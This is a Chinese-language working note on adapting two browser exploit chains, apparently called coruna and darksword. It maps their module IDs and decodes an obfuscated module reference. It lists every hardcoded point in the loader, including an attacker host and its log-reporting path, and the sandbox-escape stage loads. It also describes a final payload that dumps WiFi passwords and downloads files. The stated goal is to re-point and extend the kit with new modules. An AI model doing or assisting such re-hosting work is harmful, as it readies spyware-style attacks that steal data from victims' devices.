## 一、三个待确认项的结论

### 待确认 1：coruna `getModuleByName` 的 sha1 口径 → **已解决，且发现重大事实**

**结论：coruna 与 gasleak 入口 JS 共用同一套模块体系，模块 ID 直接用作文件名，不套 salt 哈希。**

证据链：

1. **同一 salt**：coruna `group.html:352` 与 gasleak 入口 JS 都执行
   `setSalt("cecd08aa6ff548c2")`。

2. **同一模块 ID**：
   | 模块 ID | coruna 中的身份 | gasleak 入口 JS 解出 |
   |---|---|---|
   | `57620206d62079baad0e57e6d9ec93120c0f5247` | `utility_module.js`（类型转换原语） | ✔ 同一 ID |
   | `14669ca3b1519ba2a8f40be287f646d4d7593eb0` | `platform_module.js`（版本/偏移选择） | ✔ 同一 ID |

   `group.html:347-348` 的引导段与 gasleak 入口 JS 的 `MM` 表**逐字节对应**。

3. **salt 哈希被显式注释掉**（`group.html` 的 `getModuleByURL`）：
   ```js
   let I = moduleId;
   //I = SHA256(moduleCache.p + M).substring(0, 40);
   I = moduleId; // de-randomize
   ```
   → **模块 ID 即文件名**，`entries[].name` 可直接复用 coruna 现有 SHA1，无需计算哈希。

4. **coruna 全部只有 4 个模块 ID**：
   - `57620206...` utility
   - `14669ca3...` platform
   - `ba712ef6c1bf20758e69ab945d2cdfd51e53dcd8`（`Stage2_15.0_16.2` 内引用）
   - `b5135768e043d1b362977b8ba9bff678b9946bcb`（`Stage3_VariantB` 内引用）

**模块 ID 不是内容 sha1**（已用 `sha1(decoded body)` 与 `sha1(raw file)` 双向验证均不匹配），
是构建时固定的标识符。因此**新增模块需自行分配 ID 并保证两端一致**。

### 待确认 2：darksword 硬编码点 → **已解决，改造量比预估小**

**结论：`localHost` 是唯一 base 变量，改造集中在 6 处。**

| 位置 | 内容 | 类型 |
|---|---|---|
| `rce_loader.js:8` | `var localHost = "https://sqwas.ebwlyais.xyz/assets"` | base 变量（**是 `var` 不是 `let`**） |
| `rce_loader.js:31` | `redirect()` → `.../assets/404.html` | 诱饵跳转 |
| `rce_loader.js:81/83` | `getJS(.../rce_worker_18.6.js?${Date.now()})` / `18.4` | 绝对 URL |
| `rce_loader.js:177/179` | `getJS(.../rce_module_18.6.js?...)` / `rce_module.js` | 绝对 URL |
| `rce_worker_18.4.js:938` | `getJS('/sbx0_main_18.4.js')` | **相对路径** |
| `sbx0_main_18.4.js:8421` | `getJS('/sbx1_main.js')` | **相对路径** |
| `sbx1_main.js:6765` | `get_cstring(getJS('pe_main.js'))` | **相对路径** |

其中 `rce_loader.js:8` 的 `localHost` 同时服务于 `print()` 日志上报
（`localHost + "/log.html?" + req`），一处替换即覆盖日志路径。

### 待确认 3：XOR 串二次编码 → **已解决，实为分片拼接**

`[115,113,112,116,118,116,118,112,34,112,116,118,113,127,36,39]` 经
`key=67` 后得到 `02375753a3752<gd`，再 `^0x05` 得 **`57620206d62079ba`**
——正是 utility 模块 SHA1 的**前 16 位十六进制**。

即该串是**分段拼接的模块 ID 字面量**，不是二次编码。模块 2 通过它引用模块 1，
与 `group.html` 的模块图完全一致。

## 三、另一项重要发现：`pe_main.js` 是终端载荷

`pe_main.js`（778,597 字节）中 3 处 `http://\` / `https://\` **不是真实 URL**，
而是 **webpack 内嵌的 native payload 源码字符串**（Forensics File Downloader /
WiFi Password Dump）。该模块**不 load 任何后续模块**（无 `getJS`/`fetch` 调用）。

**含义**：
- 对 `pe_main.js` 的 0 处替换是**正确行为**，不应报错。
- 其内部 native payload 若需改上报地址，属于**另一层工作**（需解 webpack、
  改内嵌字符串后再打包），不在本轮适配层范围内。
